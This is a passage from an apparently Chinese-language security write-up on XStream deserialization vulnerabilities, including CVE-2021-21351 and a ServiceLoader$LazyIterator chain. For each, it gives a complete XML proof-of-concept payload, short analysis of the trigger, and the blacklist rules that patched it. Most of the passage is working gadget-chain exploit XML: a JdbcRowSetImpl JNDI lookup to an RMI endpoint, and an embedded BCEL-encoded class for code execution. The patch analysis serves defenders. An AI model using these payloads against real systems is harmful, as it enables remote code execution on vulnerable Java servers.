class="attr">reference</span>=<span class="string">&#x27;../parent&#x27;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">processorCL</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span> <span class="attr">reference</span>=<span class="string">&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>这个和CVE-2021-21347类似，这是把远程jar改为了BCEL方式加载，相应的将processorCL改为了com.sun.org.apache.bcel.internal.util.ClassLoader。</p><p>在8u60环境下同样遇到processorCL构造的问题，更新为Wh1t3p1g师傅构造BCEL的方式之后运行成功。具体可以参考LazyIterator 中的poc。</p><h3 id="黑名单：-5"><a href="#黑名单：-5" class="headerlink" title="黑名单："></a>黑名单：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern BCEL_CL = Pattern.compile(<span class="string">&quot;.*\\.bcel\\..*\\.util\\.ClassLoader&quot;</span>);</span><br><span class="line">denyTypeHierarchy(InputStream.class);</span><br><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21351"><a href="#CVE-2021-21351" class="headerlink" title="CVE-2021-21351"></a>CVE-2021-21351</h2><p>author: wh1t3p1g</p><h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtm</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__size</span>&gt;</span>-10086<span class="tag">&lt;/<span class="name">m__size</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">__overrideDefaultParser</span>&gt;</span>false<span class="tag">&lt;/<span class="name">__overrideDefaultParser</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__incremental</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__incremental</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__source__location</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__source__location</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__defaultHandler</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__shouldStripWS</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__shouldStripWS</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__indexing</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__indexing</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__incrementalSAXSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fPullParserConfig</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">listeners</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fPullParserConfig</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">name</span>&gt;</span>setAutoCommit<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">class</span>&gt;</span>boolean<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigParse</span> <span class="attr">reference</span>=<span class="string">&#x27;../fConfigSetInput&#x27;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fParseInProgress</span>&gt;</span>false<span class="tag">&lt;/<span class="name">fParseInProgress</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__incrementalSAXSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__walker</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">nextIsRaw</span>&gt;</span>false<span class="tag">&lt;/<span class="name">nextIsRaw</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__walker</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__endDocumentOccured</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__endDocumentOccured</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__idAttributes</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__textPendingStart</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">m__textPendingStart</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__useSourceLocationProperty</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__useSourceLocationProperty</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__pastFirstElement</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__pastFirstElement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">m__dtm</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtmIdentity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmIdentity</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__dtmRoot</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmRoot</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__allowRelease</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__allowRelease</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>需要注意的是：</p><ol><li>低版本的jdk中没有__overrideDefaultParser，在8u121上测试失败，8u172上成功，8u251测试失败，原因是高版本jdk jndi注入受JEP290影响。</li></ol><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>这个也是ysomap中的XercesValue payload。</p><p>触发点在IncrementalSAXSource_Xerces.parseSome</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">parseSome</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                <span class="keyword">throws</span> SAXException, IOException, IllegalAccessException,</span></span><br><span class="line"><span class="function">                                         java.lang.reflect.InvocationTargetException</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="comment">// Take next parsing step, return false iff parsing complete:</span></span><br><span class="line">                <span class="keyword">if</span>(fConfigSetInput!=<span class="keyword">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        Object ret=(Boolean)(fConfigParse.invoke(fPullParserConfig,parmsfalse));</span><br></pre></td></tr></table></figure><p>其中fConfigParse、fPullParserConfig、parmsfalse都可控</p><h3 id="黑名单：-6"><a href="#黑名单：-6" class="headerlink" title="黑名单："></a>黑名单：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.sql.rowset.BaseRowSet&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="ServiceFinder-LazyIterator"><a href="#ServiceFinder-LazyIterator" class="headerlink" title="ServiceFinder$LazyIterator"></a>ServiceFinder$LazyIterator</h2><h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.NullCipher&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">opmode</span>&gt;</span>0<span class="tag">&lt;/<span class="name">opmode</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">&quot;java.util.ServiceLoader$LazyIterator&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">service</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">loader</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&quot;hashtable&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classes</span> <span class="attr">defined-in</span>=<span class="string">&quot;java.lang.ClassLoader&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&quot;../..&quot;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">domains</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">packages</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">nativeLibraries</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">defaultAssertionStatus</span>&gt;</span>false<span class="tag">&lt;/<span class="name">defaultAssertionStatus</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classes</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">java-class</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">java-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.lang.Runtime<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">java-class</span>&gt;</span>java.lang.Runtime<span class="tag">&lt;/<span class="name">java-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">classes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ignored__packages</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">repository</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.org.apache.bcel.internal.util.SyntheticRepository&quot;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">__path</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">paths</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">class__path</span>&gt;</span><span class="tag">&lt;/<span class="name">class__path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">__path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">__loadedClasses</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">loader</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">nextName</span>&gt;</span>$$BCEL$$$l$8b$I$A$A$A$A$A$A$Au$90$cdJ$c3$40$U$85$cfm$ab$a91$d5$fe$d8V$c1E$5d$d9$K$fd3$a4$b5T$dc$I$ae$y$8a$V$5dO$c7$a1$a4$c6$q$a4S$f5$8d$5c$bbQq$e1$D$f8P$ea$8d$I$W$c4$Z8$c3$bd$dc$f3$9d$99y$ffx$7d$D$60c$83P$O$ef$fc$fa$ae$d3$ea$ed$f5$da$b6c$b7z$dd$8e$e3t$ba$b6$B$od$t$e2V4$3d$e1$8f$9b$t$a3$89$92$da$40$92$60$O$83Y$q$d5$91$eb$v$c2$e6$3f$feFl$r$y$ee$bb$be$ab$P$I$c9j$ed$c2$82$81$b4$89$U$96$I$a9$c3$e0$8a$ed$b9$df$84$b3$99$af$dd$he$c0$e2$88$b1$d2$3f5$a1X$ad$j$ff$Z$eb$5bX$c1$aa$89$M$b2$84R$Q$w$bfR$X$V$v$3c9$f3$84$O$a2$86$I$c34$f2$i$a4$ee$95$qlW$e7$YC$j$b9$fe$b8$3f$8f$3d$8d$C$a9$a6S$c6$ae$a1$YcK$84$ccP$Ly$3d$Q$e1$b9$Yy$K$5bH$f0$dd$e3E$bc$f9$v$ac$cb$5c$b5$b9$9b$e4$b3$b0$f3$M$f3$81$7fh$f0$82$5c$be$f0$84$f2$e5$e3$f7$f0$3a$ab$F$fad$P$Z$M$89$7b$L$ac$J$y$7e$B$e0$d2$95$ea$8b$B$A$A<span class="tag">&lt;/<span class="name">nextName</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">lock</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder$NullInputStream&quot;</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">done</span>&gt;</span>false<span class="tag">&lt;/<span class="name">done</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ostart</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ostart</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ofinish</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ofinish</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">closed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">closed</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>重点是Wh1t3p1g师傅BCEL的 classLoader的构造思路及过程，可看师傅原博。</p><h3 id="黑名单：-7"><a href="#黑名单：-7" class="headerlink" title="黑名单："></a>黑名单：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern BCEL_CL = Pattern.compile(<span 